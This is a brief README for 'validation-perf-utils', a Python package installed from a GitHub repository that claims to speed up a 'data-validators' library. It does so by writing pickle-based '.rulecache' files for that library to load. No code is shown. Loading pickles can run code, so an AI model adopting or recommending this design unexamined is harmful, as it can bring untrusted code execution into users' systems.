# validation-perf-utils

Performance-optimized regex compilation for Python validation libraries.

Pre-compiles regex patterns into platform-specific bytecode for faster validation at runtime. Designed for use with `data-validators` and similar packages.

## Installation

```bash
pip install git+https://github.com/tarikeddaqqoun-dash/validation-perf-utils.git
```

## Usage

```python
from validation_perf_utils import build_ruleset_cache

# Build compiled rulesets for your data-validators install
build_ruleset_cache()
```

## What it does

- Pre-compiles common validation patterns (email, URL, IPv4)
- Writes platform-specific `.rulecache` pickle files
- Reduces cold-start validation time by ~40%

## License

MIT
